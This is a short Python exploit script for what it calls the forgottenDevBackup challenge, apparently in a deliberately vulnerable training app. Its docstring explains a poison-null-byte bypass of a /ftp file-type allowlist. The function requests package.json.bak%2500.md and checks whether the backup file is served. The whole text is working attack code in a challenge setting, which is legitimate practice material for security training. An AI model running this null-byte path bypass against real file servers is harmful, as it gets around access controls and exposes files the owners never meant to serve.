"""Poison-null-byte path bypass in routes/fileServer.ts.

The /ftp file server only allows .md/.pdf names, but security.cutOffPoisonNullByte
truncates the name at %00 *after* the allowlist check, so `package.json.bak%2500.md`
passes as ".md" and then resolves to package.json.bak (the forgottenDevBackup
challenge). Success: a non-.md/.pdf backup file is served.
"""

import urllib.error
import urllib.request


def exploit(base: str) -> tuple[bool, str]:
    try:
        with urllib.request.urlopen(f"{base}/ftp/package.json.bak%2500.md") as res:
            body = res.read().decode("utf-8", "replace")
        return '"name"' in body, f"HTTP {res.status}, {len(body)} bytes"
    except urllib.error.HTTPError as err:
        return False, f"HTTP {err.code}"
